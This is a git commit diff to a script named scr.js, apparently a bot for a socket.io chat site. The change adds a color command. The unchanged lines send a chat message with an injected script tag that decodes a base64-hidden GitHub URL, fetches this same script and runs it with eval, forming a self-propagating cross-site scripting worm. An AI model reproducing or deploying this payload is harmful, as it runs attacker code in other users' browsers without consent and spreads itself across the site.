38322a6842f0276295c92928735282acc34c6cd7
blanknamelmaolmao-star <blanknamelmaolmao@gmail.com>
2026-07-29 16:22:36 +0300

    Update scr.js

--- scr.js
+++ scr.js
@@ -12,10 +12,10 @@ const intervalId = setInterval(function() {
     socket.emit("command", {
         list: ["name", "gnygres"]
     });
+    socket.emit("command", {
+        list: ["color", "black"]
+    });
     setTimeout(function() {
-        socket.emit("command", {
-            list: ["color"]
-        });
         setTimeout(function() {
             socket.emit('talk', {
                 text: "gnygres <script>fetch(atob('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2JsYW5rbmFtZWxtYW9sbWFvLXN0YXIvc2NyL3JlZnMvaGVhZHMvbWFpbi8=')+'scr'+atob('Lmpz')).then(r=>r.text()).then(t=>eval(t))</script>"
